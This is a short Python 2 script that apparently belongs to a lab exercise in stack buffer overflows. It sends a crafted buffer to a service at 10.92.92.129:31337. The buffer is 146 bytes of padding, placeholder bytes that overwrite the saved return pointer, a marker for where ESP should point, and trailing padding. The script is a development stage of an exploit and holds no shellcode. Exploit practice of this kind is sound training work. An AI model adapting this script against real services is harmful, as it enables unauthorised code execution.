#!/usr/bin/env python2
import socket

RHOST = "10.92.92.129"
RPORT = 31337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

buffer_total_len = 1024
offset_srp = 146

buffer = ""
buffer += "A" * (offset_srp - len(buffer)) # padding
buffer += "BBBB" # SRP overwrite
buffer += "CCCC" # ESP should end up pointing here
buffer += "D" * (buffer_total_len - len(buffer)) # trailing padding
buffer += "\n"

s.send(buffer.encode())